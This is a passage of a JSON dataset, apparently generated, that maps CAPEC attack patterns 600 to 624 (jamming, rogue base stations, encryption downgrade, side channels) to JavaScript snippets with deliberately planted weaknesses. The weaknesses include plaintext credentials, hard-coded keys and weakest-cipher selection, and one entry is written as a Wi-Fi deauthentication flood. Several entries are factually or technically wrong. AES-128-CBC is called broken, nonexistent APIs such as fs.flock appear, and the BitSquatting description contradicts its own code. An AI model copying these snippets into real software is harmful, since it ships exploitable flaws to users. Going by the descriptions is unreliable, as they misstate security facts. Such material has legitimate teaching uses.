        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It embodies the main idea of CAPEC-credential stuffing by demonstrating how an adversary could exploit weak authentication mechanisms. The code includes several related CWEs: CWE-522 (Insufficiently Protected Credentials) by storing passwords in plaintext, CWE-307 (Improper Restriction of Excessive Authentication Attempts) by not implementing a proper lockout mechanism after multiple failed attempts, and CWE-308 (Use of Single-factor Authentication) by relying solely on username and password for authentication. The code highlights the vulnerabilities that could be exploited in a credential stuffing attack."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    \n    // CWE-924: No integrity check\n    if (data.toString() === 'legitimate') {\n      socket.write('Access granted');\n    } else {\n      socket.write('Access denied');\n    }\n  });\n});\n\nserver.listen(8080, '127.0.0.1');\n\n// CWE-406: No control over network message volume\nconst client = net.createConnection({ port: 8080, host: '127.0.0.1' }, () => {\n  for (let i = 0; i < 1000; i++) {\n    client.write('legitimate');\n  }\n});\n\n// CWE-923: No endpoint verification\nclient.on('data', (data) => {\n  console.log('Server says:', data.toString());\n});\n\n// CWE-421: Race condition\nsetTimeout(() => {\n  const alternateClient = net.createConnection({ port: 8080, host: '127.0.0.1' }, () => {\n    alternateClient.write('legitimate');\n  });\n  alternateClient.on('data', (data) => {\n    console.log('Alternate client says:', data.toString());\n  });\n}, 1000);",
        "description": "This JavaScript code snippet demonstrates a TCP server and client setup that embodies the main idea of the CAPEC 'Jamming' attack. The server listens for incoming connections and processes data without verifying message integrity (CWE-924) or ensuring the endpoint is correct (CWE-923). Sensitive information is transmitted in cleartext (CWE-319). The client sends a high volume of messages to the server (CWE-406), potentially overwhelming it. Additionally, a race condition is introduced by opening an alternate communication channel (CWE-421), which could be exploited by an attacker to disrupt legitimate communications."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "const crypto = require('crypto');\n\n// Using an obsolete function for cryptographic operations\nfunction insecureHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Storing sensitive data without proper protection\nlet sensitiveData = insecureHash('password123');\n\nconsole.log('Stored Hash:', sensitiveData);",
        "description": "This JavaScript code snippet demonstrates the use of an obsolete cryptographic function (MD5) to hash sensitive data, which is then stored without proper protection. The use of MD5 is deprecated due to its vulnerabilities to collision attacks, representing CWE-477 (Use of Obsolete Function). Additionally, the code fails to protect the stored hash from potential modification or unauthorized access, aligning with the deprecated CWE-217 (Failure to Protect Stored Data from Modification). This snippet embodies the main idea of the CAPEC by showcasing how deprecated and insecure practices can lead to vulnerabilities in software."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Simulate resource allocation without limits\n  let data = [];\n  for (let i = 0; i < 1e6; i++) {\n    data.push(new Array(1e6).join('x'));\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Resource allocated');\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server allocates a large amount of memory for each request without any limits or throttling, which can lead to uncontrolled resource consumption (CWE-400). This can cause the system to exhaust its available memory, leading to a denial of service (DoS) condition, embodying the main idea of the CAPEC 'Blockage'. The code demonstrates how improper resource management can be exploited to block the delivery of important system resources, causing the system to fail or stop working."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "const wifi = require('wifi-control');\n\nwifi.init({ debug: true });\n\nconst deauthAttack = (targetSSID) => {\n  wifi.scanForWiFi((err, response) => {\n    if (err) console.log(err);\n    const target = response.networks.find(net => net.ssid === targetSSID);\n    if (target) {\n      for (let i = 0; i < 100; i++) { // Flood with deauth frames\n        wifi.deauth(target.mac, (err) => {\n          if (err) console.log('Deauth error:', err);\n        });\n      }\n    }\n  });\n};\n\ndeauthAttack('TargetNetwork');",
        "description": "This JavaScript code snippet demonstrates a Wi-Fi jamming attack by flooding a target Wi-Fi network with deauthentication frames. The 'wifi-control' library is used to scan for available networks and identify the target network by its SSID. Once the target is found, the code sends multiple deauthentication frames to the target's MAC address, effectively disrupting the network. This embodies the main idea of the CAPEC by actively preventing users from transmitting or receiving data on the targeted Wi-Fi network. The code also highlights related CWEs such as improper enforcement of message integrity (CWE-924) and improper verification of the source of a communication channel (CWE-940), as it does not ensure the integrity or authenticity of the deauthentication frames being sent."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '192.168.1.1', () => {\n  console.log('Connected to server');\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  client.write('SensitiveData');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  if (data !== 'ExpectedResponse') {\n    console.error('Data integrity check failed');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-300: Channel Accessible by Non-Endpoint\nconst server = net.createServer((socket) => {\n  socket.write('Hello Client');\n  socket.on('data', (data) => {\n    console.log('Received from client: ' + data);\n  });\n});\n\nserver.listen(12345, '192.168.1.1');",
        "description": "This JavaScript code snippet demonstrates a basic TCP client-server communication setup using the 'net' module. The client connects to a server and sends sensitive data in cleartext (CWE-319), which can be intercepted by unauthorized actors. The server responds with a message, but the client does not properly enforce message integrity during transmission (CWE-924), making it vulnerable to tampering. Additionally, the server does not adequately verify the identity of the client (CWE-300), allowing potential unauthorized access. This setup embodies the main idea of the Cellular Jamming CAPEC by illustrating how improper handling of communication channels can lead to vulnerabilities that disrupt or compromise the integrity of the communication."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(availableAlgorithms) {\n  // CWE-757: Select the weakest algorithm available\n  const selectedAlgorithm = availableAlgorithms.includes('A5/0') ? 'A5/0' : availableAlgorithms.includes('A5/1') ? 'A5/1' : 'A5/2';\n  return selectedAlgorithm;\n}\n\nfunction encryptData(data, algorithm) {\n  // CWE-327: Use a broken or risky cryptographic algorithm\n  if (algorithm === 'A5/0') {\n    // No encryption\n    return data;\n  } else if (algorithm === 'A5/1' || algorithm === 'A5/2') {\n    // Simulate weak encryption\n    const cipher = crypto.createCipher('aes-128-cbc', 'hardcodedkey'); // CWE-321: Use of hard-coded cryptographic key\n    let encrypted = cipher.update(data, 'utf8', 'hex');\n    encrypted += cipher.final('hex');\n    return encrypted;\n  }\n}\n\nconst availableAlgorithms = ['A5/0', 'A5/1', 'A5/2'];\nconst selectedAlgorithm = negotiateEncryption(availableAlgorithms);\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encryptData(sensitiveData, selectedAlgorithm);\nconsole.log(`Selected Algorithm: ${selectedAlgorithm}`);\nconsole.log(`Encrypted Data: ${encryptedData}`);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Weakening of Cellular Encryption' by simulating the selection of a weak encryption algorithm during negotiation and using it to encrypt data. The `negotiateEncryption` function embodies CWE-757 by selecting the weakest available algorithm (A5/0, A5/1, or A5/2). The `encryptData` function uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (CWE-327) to simulate weak encryption. The code highlights the vulnerabilities associated with using weak or no encryption, which aligns with the main idea of the CAPEC."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "const fs = require('fs');\n\n// Simulate obstruction by locking a file\nfunction lockFile(filePath) {\n  fs.open(filePath, 'r+', (err, fd) => {\n    if (err) throw err;\n    fs.flock(fd, 'ex', (err) => {\n      if (err) throw err;\n      console.log('File locked');\n    });\n  });\n}\n\n// Simulate improper isolation by allowing unauthorized access\nfunction readFile(filePath) {\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) throw err;\n    console.log('File content:', data);\n  });\n}\n\n// Simulate error injection\nfunction injectError(filePath) {\n  fs.appendFile(filePath, 'ERROR', (err) => {\n    if (err) throw err;\n    console.log('Error injected');\n  });\n}\n\n// Example usage\nconst filePath = 'example.txt';\nlockFile(filePath);\nreadFile(filePath);\nsetTimeout(() => injectError(filePath), 1000);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Obstruction' by simulating the locking of a file, which obstructs other operations on it. The `lockFile` function locks a file, representing the obstruction of interactions between system components. The `readFile` function simulates improper isolation by allowing unauthorized access to read the file content. The `injectError` function simulates unauthorized error injection by appending an error message to the file. This code embodies the main idea of CAPEC by showing how an attacker can obstruct system interactions and cause a degraded state or improper functioning, leveraging related CWEs such as improper isolation and unauthorized error injection."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Use of a broken or risky cryptographic algorithm (CWE-327)\nconst algorithm = 'aes-128-cbc'; // A weak encryption algorithm\nconst key = '1234567890123456'; // Hard-coded cryptographic key (CWE-321)\nconst iv = crypto.randomBytes(16);\n\nfunction encrypt(text) {\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(text);\n  encrypted = Buffer.concat([encrypted, cipher.final()]);\n  return iv.toString('hex') + ':' + encrypted.toString('hex');\n}\n\nfunction decrypt(text) {\n  const textParts = text.split(':');\n  const iv = Buffer.from(textParts.shift(), 'hex');\n  const encryptedText = Buffer.from(textParts.join(':'), 'hex');\n  const decipher = crypto.createDecipheriv(algorithm, Buffer.from(key), iv);\n  let decrypted = decipher.update(encryptedText);\n  decrypted = Buffer.concat([decrypted, decipher.final()]);\n  return decrypted.toString();\n}\n\n// Example usage\nconst message = 'Sensitive data';\nconst encryptedMessage = encrypt(message);\nconsole.log('Encrypted:', encryptedMessage);\nconst decryptedMessage = decrypt(encryptedMessage);\nconsole.log('Decrypted:', decryptedMessage);",
        "description": "This JavaScript code snippet demonstrates the use of a broken or risky cryptographic algorithm (CWE-327) and a hard-coded cryptographic key (CWE-321) to encrypt and decrypt sensitive data. The algorithm used is 'aes-128-cbc', which is considered weak by modern standards. The key is hard-coded, making it susceptible to discovery and misuse. This example embodies the main idea of the CAPEC by showing how weak encryption and poor key management can lead to vulnerabilities in cellular encryption, potentially allowing attackers to decrypt sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: No verification of the source of the request\n  if (req.url === '/sensitive-data') {\n    // CWE-319: Transmitting sensitive data in cleartext\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Information: User Passwords');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. When a request is made to the '/sensitive-data' endpoint, it responds with sensitive information (user passwords) in cleartext. This demonstrates several vulnerabilities: CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the request, and CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits sensitive data in cleartext. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showing how sensitive data can be intercepted if not properly secured."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user_password=12345'; // CWE-201: Insertion of Sensitive Information Into Sent Data\n\nhttp.createServer((req, res) => {\n  if (req.url === '/debug') {\n    // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Debug mode activated');\n  } else {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sensitiveData);\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n// No integrity checks are performed on incoming requests or outgoing responses\n\n// CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n// No rate limiting or traffic volume control is implemented",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It demonstrates several vulnerabilities related to the CAPEC 'Cellular Data Injection' and the associated CWEs. The server has a debug endpoint ('/debug') that can be activated at runtime (CWE-1313), which could be exploited to alter the system's behavior. Sensitive information (user password) is transmitted in cleartext (CWE-319) without any encryption, making it susceptible to interception. The code does not enforce message integrity (CWE-924), allowing potential modification of data during transmission. Additionally, there is no control over the volume of network messages (CWE-406), which could lead to network amplification attacks. The inclusion of sensitive data in the response (CWE-201) further exacerbates the security risks."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const trustedDomain = 'https://trusted-site.com';\nconst userInput = 'https://trusted-s1te.com'; // BitSquatted domain\n\nfunction redirectToDomain(domain) {\n  if (domain.startsWith('https://trusted-site.com')) {\n    window.location.href = domain;\n  } else {\n    console.error('Untrusted domain detected!');\n  }\n}\n\n// Simulate user input for redirection\nredirectToDomain(userInput);",
        "description": "This JavaScript code snippet demonstrates a BitSquatting attack scenario where an adversary registers a domain name that is one bit different from a trusted domain (e.g., 'https://trusted-s1te.com' instead of 'https://trusted-site.com'). The `redirectToDomain` function attempts to redirect the user to the provided domain if it starts with the trusted domain URL. However, due to the bit-flipped domain, the check fails, and the user is redirected to the untrusted domain. This snippet also highlights CWE-601 (URL Redirection to Untrusted Site) by showing how user-controlled input can lead to redirection to a potentially malicious site. The code is a simplified example to illustrate the concept of BitSquatting and its potential impact on web security."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "const wifi = require('node-wifi');\nconst fs = require('fs');\n\nwifi.init({ iface: null });\n\nfunction logMacAddresses() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    const macAddresses = networks.map(network => network.mac);\n    fs.appendFile('mac_addresses.log', macAddresses.join('\\n') + '\\n', (err) => {\n      if (err) console.error('Error writing to log file:', err);\n    });\n  });\n}\n\nsetInterval(logMacAddresses, 60000); // Scan every minute",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for nearby WiFi networks and log their MAC addresses to a file named 'mac_addresses.log'. The scan is performed every minute using setInterval. The code embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively collecting and logging MAC addresses, which can be used to track users. The code also touches on related CWEs: it transmits sensitive information (MAC addresses) that should not be accessible (CWE-201), and it does not verify the identity of actors accessing the log file (CWE-300)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "const wifi = require('node-wifi');\n\nwifi.init({ iface: null });\n\nwifi.scan((error, networks) => {\n  if (error) {\n    console.error(error);\n  } else {\n    networks.forEach(network => {\n      if (network.ssid) {\n        console.log(`Detected SSID: ${network.ssid}`);\n      }\n    });\n  }\n});",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for available WiFi networks and logs the SSIDs of detected networks. The code initializes the WiFi module, performs a scan, and then iterates over the detected networks to print out their SSIDs. This embodies the main idea of the CAPEC 'WiFi SSID Tracking' by demonstrating how an attacker could passively listen for WiFi management frames to capture SSIDs. The related CWEs are represented in the context of transmitting sensitive information (SSID) without proper security measures, allowing unauthorized actors to access this information."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak DES key\nconst desKey = '12345678'; // 8-byte key for DES\n\n// Function to simulate sending an OTA update via SMS\nfunction sendOTAUpdate(message) {\n  const cipher = crypto.createCipheriv('des-ecb', desKey, null);\n  let encryptedMessage = cipher.update(message, 'utf8', 'hex');\n  encryptedMessage += cipher.final('hex');\n  console.log(`Sending OTA update: ${encryptedMessage}`);\n}\n\n// Simulate an attacker cracking the DES key and sending a malicious OTA update\nfunction attackerSendMaliciousUpdate() {\n  const crackedKey = '12345678'; // Assume attacker cracked the key\n  const maliciousMessage = 'MALICIOUS_CODE';\n  const cipher = crypto.createCipheriv('des-ecb', crackedKey, null);\n  let encryptedMessage = cipher.update(maliciousMessage, 'utf8', 'hex');\n  encryptedMessage += cipher.final('hex');\n  console.log(`Attacker sending malicious OTA update: ${encryptedMessage}`);\n}\n\n// Simulate sending a legitimate OTA update\nsendOTAUpdate('LEGITIMATE_UPDATE');\n\n// Simulate attacker sending a malicious OTA update\nattackerSendMaliciousUpdate();",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. It uses a weak DES key (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to encrypt an OTA update message. The `sendOTAUpdate` function simulates sending a legitimate OTA update via SMS, while the `attackerSendMaliciousUpdate` function simulates an attacker who has cracked the DES key and sends a malicious OTA update. This represents the vulnerability where an attacker can exploit weak encryption to send executable code to the SIM card, potentially leading to unauthorized actions such as sending SMS, changing voicemail numbers, or querying phone location."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'username=admin&password=secret';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// Simulate a client connecting to an Evil Twin Wi-Fi\nconst httpClient = require('http');\n\nhttpClient.get('http://127.0.0.1:8080', (resp) => {\n  let data = '';\n\n  // A chunk of data has been received.\n  resp.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  // The whole response has been received.\n  resp.on('end', () => {\n    console.log('Received data: ' + data);\n  });\n\n}).on('error', (err) => {\n  console.log('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic HTTP server that transmits sensitive information in cleartext, embodying the concept of an Evil Twin Wi-Fi Attack. The server sends sensitive data (username and password) without encryption (CWE-319). An adversary could set up an Evil Twin Wi-Fi access point to intercept this data. The client simulation shows how an attacker might capture the transmitted data. This example highlights the risks of cleartext transmission and the importance of verifying communication channels to prevent unauthorized access and data interception."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configPath) {\n  const defaultPath = path.join(__dirname, 'config.json');\n  const userPath = path.join(configPath, 'config.json');\n\n  let config;\n  if (fs.existsSync(userPath)) {\n    config = JSON.parse(fs.readFileSync(userPath, 'utf8'));\n  } else {\n    config = JSON.parse(fs.readFileSync(defaultPath, 'utf8'));\n  }\n\n  return config;\n}\n\nconst config = loadConfig('/untrusted/path');\nconsole.log(config);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the 'Establish Rogue Location' CAPEC. The function `loadConfig` attempts to load a configuration file from a user-specified path (`/untrusted/path`). If the file exists at the user-specified path, it loads the configuration from there; otherwise, it falls back to a default path. This can be exploited by an adversary who places a malicious `config.json` file at the user-specified path, leading to potential exposure of sensitive information (CWE-200), improper verification of the source (CWE-940), and untrusted search path issues (CWE-426). The code does not verify the integrity or authenticity of the configuration file, making it susceptible to rogue location attacks."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    // Improper verification of source\n    if (data.toString().includes('AUTH')) {\n      socket.write('AUTH_SUCCESS');\n    } else {\n      socket.write('INVALID_REQUEST');\n    }\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate a rogue base station\nconst rogueClient = net.createConnection({ port: 8080 }, () => {\n  console.log('Connected to server');\n  rogueClient.write('AUTH'); // Improper enforcement of message integrity\n});\n\nrogueClient.on('data', (data) => {\n  console.log('Server response:', data.toString());\n  rogueClient.end();\n});\n\nrogueClient.on('end', () => {\n  console.log('Disconnected from server');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of a Cellular Rogue Base Station attack. The server listens for incoming connections and processes data without properly verifying the source of the communication channel (CWE-940). The server also does not ensure the integrity of the messages received (CWE-924). A rogue client connects to the server and sends an 'AUTH' message, which the server accepts without proper validation, simulating the attack where a rogue base station convinces a device to communicate with it. This code highlights the vulnerabilities related to improper verification and message integrity in communication channels."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "const sendBroadcastMessage = (phoneNumber, message) => {\n  // Simulate sending a broadcast message to a specific phone number\n  const cellTower = getCellTowerForPhoneNumber(phoneNumber);\n  if (!cellTower) {\n    console.error('Cell tower not found for the given phone number.');\n    return;\n  }\n  // Simulate sending the message to the cell tower\n  console.log(`Sending message to cell tower ${cellTower}: ${message}`);\n};\n\nconst getCellTowerForPhoneNumber = (phoneNumber) => {\n  // Simulate retrieving the cell tower for a given phone number\n  // In a real scenario, this would involve querying the cellular network\n  const cellTowers = {\n    '123-456-7890': 'Tower1',\n    '098-765-4321': 'Tower2'\n  };\n  return cellTowers[phoneNumber];\n};\n\n// Example usage\nconst targetPhoneNumber = '123-456-7890';\nconst broadcastMessage = 'Emergency Alert!';\nsendBroadcastMessage(targetPhoneNumber, broadcastMessage);",
        "description": "This JavaScript code snippet simulates the process of sending a broadcast message to a mobile device based on its phone number, which is associated with a specific cell tower. The `sendBroadcastMessage` function takes a phone number and a message as inputs, retrieves the corresponding cell tower using the `getCellTowerForPhoneNumber` function, and then logs the action of sending the message to that cell tower. This represents the CAPEC scenario where an attacker uses knowledge of the target's phone number to trigger broadcast messages and infer the target's location based on the cell tower's response. The code also highlights potential vulnerabilities such as the insertion of sensitive information into sent data (CWE-201), improper verification of the source of a communication channel (CWE-940), and the channel being accessible by non-endpoints (CWE-300)."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'UserLocationData';\n\nhttp.createServer((req, res) => {\n  if (req.url === '/track') {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // No verification of the request source\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    \n    // CWE-201: Insertion of Sensitive Information Into Sent Data\n    // Sending sensitive data without proper protection\n    res.end(`Location: ${sensitiveData}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for incoming requests. When a request is made to the '/track' endpoint, the server responds with sensitive user location data without verifying the source of the request (CWE-940) and without protecting the sensitive information (CWE-201). This represents the main idea of the CAPEC 'Signal Strength Tracking' by demonstrating how an attacker could exploit the lack of proper verification and protection mechanisms to obtain sensitive location data. The code highlights the vulnerabilities that could be exploited to track a user's location through improper handling of sensitive information and communication channels."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return iv.toString('hex') + ':' + encrypted;\n}\n\nfunction negotiateAlgorithm(clientPref, serverPref) {\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  const supportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\n  for (let alg of clientPref) {\n    if (serverPref.includes(alg) && supportedAlgorithms.includes(alg)) {\n      return alg;\n    }\n  }\n  return 'aes-128-cbc'; // Default to a less secure algorithm\n}\n\nconst clientAlgorithms = ['aes-128-cbc'];\nconst serverAlgorithms = ['aes-256-cbc', 'aes-128-cbc'];\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithms, serverAlgorithms);\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encryptData(sensitiveData, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the encryption level to be lowered, making the encrypted data more vulnerable. The `negotiateAlgorithm` function simulates the negotiation process between a client and a server to select an encryption algorithm. Due to the presence of CWE-757, the function defaults to a less secure algorithm ('aes-128-cbc') if the client's preferred algorithm is not the strongest available. Additionally, the `encryptData` function uses a hard-coded cryptographic key (CWE-321), further weakening the encryption. The code highlights the risks associated with algorithm downgrade attacks and the use of inadequate encryption practices."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    // Sending sensitive information in cleartext\n    client.write('username=admin&password=secret');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Simulate different processing times based on data content\n    if (data.toString().includes('success')) {\n        setTimeout(() => client.destroy(), 100);\n    } else {\n        setTimeout(() => client.destroy(), 500);\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends sensitive information (username and password) in cleartext. This embodies CWE-319 (Cleartext Transmission of Sensitive Information). The client then processes the server's response and closes the connection after a delay that varies based on the content of the response, representing CWE-208 (Observable Timing Discrepancy). An attacker could intercept the transmission and analyze the packet timing and sizes to infer sensitive information, aligning with the CAPEC description of analyzing packet timing and sizes."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendData(data) {\n  const key = '12345678901234567890123456789012'; // Weak key\n  const encryptedData = encryptData(data, key);\n  console.log('Sending data:', encryptedData);\n}\n\nconst sensitiveData = 'This is a secret message';\nsendData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is encrypted using a weak cryptographic key and then transmitted. The `encryptData` function uses the 'aes-256-cbc' algorithm with a hardcoded key, which is a poor practice (CWE-327: Use of a Broken or Risky Cryptographic Algorithm). The `sendData` function logs the encrypted data to the console, simulating the transmission of sensitive information (CWE-201: Insertion of Sensitive Information Into Sent Data). This setup is vulnerable to electromagnetic side-channel attacks (CAPEC-201), as an attacker could potentially monitor electromagnetic emissions during the encryption process to derive the cryptographic key or the original data. The code also lacks proper protection mechanisms against physical side channels (CWE-1300) and does not ensure the integrity of the communication channel (CWE-300)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\nfunction processSensitiveData(data) {\n  // Simulate processing sensitive data\n  console.log('Processing sensitive data...');\n  // Simulate a side channel by logging data length\n  console.log('Data length:', data.length); // CWE-1300: Improper Protection of Physical Side Channels\n}\n\nfunction sendData(data) {\n  // Simulate sending data over a network\n  console.log('Sending data:', data); // CWE-201: Insertion of Sensitive Information Into Sent Data\n}\n\nfunction handleError(error) {\n  // Simulate handling an error\n  console.error('Error occurred:', error);\n  // Improperly handle error messages\n  console.log('Alert: Error condition detected'); // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n}\n\ntry {\n  processSensitiveData(sensitiveData);\n  sendData(sensitiveData);\n} catch (error) {\n  handleError(error);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is processed and transmitted, embodying the concept of a Compromising Emanations Attack. The `processSensitiveData` function simulates processing sensitive data and logs the data length, representing a physical side channel vulnerability (CWE-1300). The `sendData` function simulates sending data over a network, including sensitive information that should not be transmitted (CWE-201). The `handleError` function simulates error handling but improperly manages error messages and alerts (CWE-1320). This code highlights how unintentional signals and improper protections can lead to the exposure of sensitive information."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "function performSensitiveOperation() {\n  // Simulate a cryptographic operation\n  let secretKey = 'superSecretKey';\n  let data = 'sensitiveData';\n  let encryptedData = encrypt(data, secretKey);\n  \n  // Simulate a hardware fault injection vulnerability\n  if (isVoltageGlitchDetected() || isClockGlitchDetected() || isEMFIDetected()) {\n    console.error('Hardware fault injection detected!');\n    return null;\n  }\n  \n  // Continue with the operation if no fault detected\n  return encryptedData;\n}\n\nfunction encrypt(data, key) {\n  // Simple encryption logic (for demonstration purposes)\n  return btoa(data + key);\n}\n\nfunction isVoltageGlitchDetected() {\n  // Placeholder for voltage glitch detection logic\n  return false; // Simulate no detection\n}\n\nfunction isClockGlitchDetected() {\n  // Placeholder for clock glitch detection logic\n  return false; // Simulate no detection\n}\n\nfunction isEMFIDetected() {\n  // Placeholder for EM fault injection detection logic\n  return false; // Simulate no detection\n}\n\n// Example usage\nlet result = performSensitiveOperation();\nif (result) {\n  console.log('Operation successful:', result);\n} else {\n  console.log('Operation failed due to hardware fault injection.');\n}",
